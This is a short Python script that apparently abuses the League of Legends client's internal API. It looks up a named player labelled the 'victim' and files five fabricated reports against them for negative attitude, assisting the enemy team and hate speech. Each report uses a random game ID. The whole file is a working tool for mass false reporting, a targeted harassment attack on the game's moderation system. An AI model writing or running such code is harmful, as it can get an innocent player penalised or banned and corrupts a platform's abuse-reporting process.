import random
from urllib3 import disable_warnings
import json

from classes.league_client import LeagueClient
from classes.lcu_call import LCUCall
from classes.riot_call import RiotCall
from services.LcdsServiceProxy import LcdsServiceProxy

# suppress warnings
# requests.packages.urllib3.disable_warnings()
disable_warnings()

VICTIM_SUMMONER_NAME = 'Haver Volren'

def main():
    league_client = LeagueClient()

    lcu = LCUCall(league_client)
    riot = RiotCall(league_client)

    lcdsServiceProxy = LcdsServiceProxy(league_client)

    current_summoner = lcu.get_current_summoner()
    print(f'Connected: {current_summoner["displayName"]}')

    victim = lcu.get_summoner_by_name(VICTIM_SUMMONER_NAME)
    print(f'Victim Name: {victim["displayName"]}')
    print(f'Victim Summoner ID: {victim["summonerId"]}')
    print(f'Victim Summoner Puuid: {victim["puuid"]}')

    # Report 5 times.
    for i in range(5):
        GAME_ID = random.randint(3000000000, 3320381967) # Random game ID.
        
        data = json.dumps({
            'comments': '',
            'gameId': GAME_ID,
            'offenderSummonerId': victim['summonerId'],
            'offenses': 'NEGATIVE_ATTITUDE,ASSISTING_ENEMY_TEAM,HATE_SPEECH'
        })

        r = lcdsServiceProxy.call(["", "report", "reportPlayer", f"{data}"])
        print(r)


if __name__ == '__main__':
    main()
